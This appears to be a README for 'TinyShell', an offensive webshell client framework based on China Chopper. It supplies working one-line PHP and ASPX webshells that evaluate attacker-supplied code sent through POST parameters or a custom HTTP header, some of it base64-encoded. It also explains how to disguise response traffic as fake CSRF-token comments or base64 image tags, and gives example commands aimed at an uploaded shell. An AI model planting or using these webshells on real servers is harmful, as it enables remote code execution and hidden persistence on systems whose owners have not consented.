# TinyShell

## New idea based on 

 - SubShell webshell framework
 - China Chopper Webshell (https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html)

## Major Changes

 - All functions passed as code to be evaluated on server
 - Reduces server side code to potentially 1 line
 - new 'shell' code can be added to any page on a site

## Encoding Header Examples

### Fake CSRF Token hidden in comment

```python
rsp_header = '<!-- csrf_token='
rsp_footer = ' -->'
```

### Base64 IMG tag

```python
rsp_header = '<img src="data:image/gif base64'
rsp_footer = '"/>'
```

### Commandline Examples

#### Clear text POST parameter (password) used to deliver commands

python tinyshell.py --url=http://10.0.2.10/bricks/upload/uploads/s.php --language=php

#### Base64 Encoded POST Parameter (viewstate) used to deliver commands

python tinyshell.py --url=http://10.0.2.10/bricks/upload/uploads/s.php --language=php --password=viewstate --mode=base64_post

#### Base64 Encoded HTTP HEADER (PESSSION) used to deliver commands

python tinyshell.py --url=http://10.0.2.10/bricks/upload/uploads/s.php --language=php --password=psession --mode=base64_header

## Server side examples (webshell)

# Clear Text POST parameter

```php
<?php @eval($_POST['password']);?>
```

# Base64 Encoded POST parameter

```php
<?php @eval(base64_decode($_POST['password']));?>
```

# Base64 Encoded HEADER parameter

```php
<?php @eval(base64_decode($_SERVER['HTTP_PSESSION']));?>

```

 ```aspx
 <%@ Page Language="Jscript"%><%eval(Request.Item["password"],"unsafe");%>
 ```